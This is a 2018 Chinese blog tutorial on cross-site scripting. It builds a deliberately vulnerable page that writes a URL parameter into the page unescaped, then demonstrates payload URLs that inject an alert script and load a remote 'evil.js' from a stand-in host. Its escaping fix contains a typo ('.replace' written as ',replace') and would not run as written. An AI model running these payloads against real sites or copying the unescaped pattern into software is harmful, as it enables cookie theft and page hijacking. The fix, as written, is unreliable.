title: js跨站脚本
author: Ming ming
tags:
  - js
  - 跨站脚本
categories:
  - 前端
  - js
  - 客户端js
date: 2018-08-03 03:19:00
---
xss
跨站脚本，称为xss这个术语用来表示一类的安全问题，指攻击者向目标web站点注入html标签或者脚本。
# 来一个小栗子
>　substring 返回介于两者之间的字符串，如果省去最后一个参数，则直接以length为填充

> window.location.search 返回/后面内容包括问号

> 返回？后面的参数
window.location.search.substring(1)

> decodeURIComponent() 将url进行解码，返回解码后的utf-8格式

```
<!doctype html>
<html>
<head>
	<title>这是标题</title>
	<meta charset="utf-8">
</head>
<body>
	<script>
		var name = decodeURIComponent(window.location.search.substring(1));	// 获取参数
		console.log(name);
		document.write("hello " + name);
	</script>
</body>
</html>
```
访问 
```
http://abc.com:8887/?%20word
```
> 本地使用web server for chrome 完成了本地静态服务器的搭建，使用host文件，强制修改home.abc.com 以及 abc.com 到 127.0.0.1 完成域名的绑定,因为js脚本不能本地运行，因为有跨域的限制

页面输出
```
 hello word 
```
这是一个灰常正经的页面。
下面如果尝试输入
```
http://abc.com:8887/?%3Cscript%3Ealert("David")%3C/script
```
事实上现在的浏览器很智能了。。已经自动解析了。已经自动暂停解析了，最后加上%3e被浏览器拦截，自动的，去掉以后，由于容错机制，自动生成
好吧，要不是这容错机制，xss还没法实验呢。无奈，现在太智能了，小白的手法，已经不行喽
```
<script>
</script>
```
导致能允许。好吧，去掉自动拦截，chrome直接禁止访问了。╮(╯▽╰)╭
https://developer.mozilla.org/zh-CN/docs/Web/HTML/Optimizing_your_pages_for_speculative_parsing
使用的是预解析，自动平衡树

此时script变身成为
```
document.write('hello ' + <script>alert("David")</script)
```
好啦，接着，就会出现一个弹窗，David
因为使用这个url自动生成一个另外一个脚本，由于浏览器自动的安全措施，所以使用浏览器页面预解析，写一个不平衡的树，初始浏览器解析的时候自动添加上
```
<script>
</script>
```
> 事实上，现在基本上都会屏蔽掉的，和sql注入一样，都是非常小白的攻击手法。╮(╯▽╰)╭

导致出现弹窗，xss完成
接着下面还有
使用src引入一个脚本。
```
http://abc.com:8887/?%3Cscript%20src=%E2%80%9Chttps://1.com/evil.js%E2%80%9D%3E%3C/script%3E
```
这样就完成了一次脚本的注入。会将其他站点的脚本，通过连接进行注入。
可以对该站点的内容做任何的操作，以及读取cookie，以及将数据发送回站点
> 事实上浏览器插件就是这样干的，在页面中加入js脚本，通过更改页面的js来达到对页面修改的目的

更多内容 https://www.ibm.com/developerworks/cn/security/se-prevent-cross-site-scripting-attacks/index.html

# 预防 
通过使用replace()全部替换为实体即可。
```
name = name.replace(/</g, "&lt;"),replace(/>/g, "&gt;");
```
# 总结
xss和sql注入一样，属于小白攻击法，要说简单也很简单，要说难也很难

# 拒绝服务攻击
如果一个站点无限弹窗，浏览器会卡死。包括使用js挖矿什么的，都不值得一提了。
